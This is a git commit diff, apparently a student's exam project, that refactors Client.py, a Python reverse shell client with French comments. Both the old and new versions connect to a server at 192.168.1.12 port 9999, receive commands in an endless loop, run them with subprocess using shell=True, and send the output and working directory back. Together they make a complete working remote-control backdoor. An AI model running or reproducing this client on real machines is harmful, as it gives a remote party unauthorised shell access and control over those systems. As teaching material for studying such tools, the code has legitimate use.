7f185fcf0742ac56baee4e263fb4e4d6d3a4c65b
Dorian <etu28445@henallux.be>
2018-12-30 11:15:32 +0100

    Script client Exam

--- Client.py
+++ Client.py
@@ -2,24 +2,48 @@ import os  #interagir avec l'OS
 import socket
 import subprocess  #aussi pour controler le système d'exploitation
 
-sock = socket.socket()
-host = '192.168.1.12' #IP du serveur
-port = 9999 #Port du serveur
+# Creation du socket
+def create_socket():
+    try:
+        global host
+        global port
+        global sock
+        host = '192.168.1.12'
+        port = 9999
+        sock = socket.socket()
+    except socket.error as msg:
+        print("Error during the creation of the socket ... " + str(msg))
 
-sock.connect((host, port)) #connexion
+# Connection au serveur
+def socket_connection():
+    try:
+        global host
+        global port
+        global sock
+        sock.connect((host, port))
+    except socket.error as msg:
+        print("Error with the conection to the socket ... " + str(msg))
 
-while True: #boucle infinie pour écouter en permanence pour des instructions
-    data = sock.recv(1024)  #données qu'il reçoit du serveur
-    if data[:2].decode("utf-8") == 'cd':  #check si les deux premier caractères sont égal à "cd"
-        os.chdir(data[3:].decode("utf-8")) #changé de répertoire grâce à os.chdir
-    if len(data) > 0: #être certain qu'il y a bien des données reçue de la part du serveur
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        # ouvre une tâche + options de sortie, d'entrée, ...
-        output_bytes = cmd.stdout.read() + cmd.stderr.read() #sortie au format byte
-        output_str = str(output_bytes, "utf-8") # sortie au format string
-        sock.send(str.encode(output_str + str(os.getcwd()) + '> ')) # envoie du résultat
-        print(output_str) # affichage du résultat côté client
+def recv_cmd():
+    global sock
+    while True:
+        #boucle infinie pour écouter en permanence pour des instructions
+        data = sock.recv(1024)  #données qu'il reçoit du serveur
+        if data[:2].decode("utf-8") == 'cd':  #check si les deux premier caractères sont égal à "cd"
+            os.chdir(data[3:].decode("utf-8")) #changé de répertoire grâce à os.chdir
+        if len(data) > 0: #être certain qu'il y a bien des données reçue de la part du serveur
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            # ouvre une tâche + options de sortie, d'entrée, ...
+            output_bytes = cmd.stdout.read() + cmd.stderr.read() #sortie au format byte
+            output_str = str(output_bytes, "utf-8") # sortie au format string
+            sock.send(str.encode(output_str + str(os.getcwd()) + '> ')) # envoie du résultat
+            print(output_str) # affichage du résultat côté client
+    sock.close()
 
+def main():
+    create_socket()
+    socket_connection()
+    recv_cmd()
 
-# Fermer la connection
-sock.close() #fermeture du socket
+main()
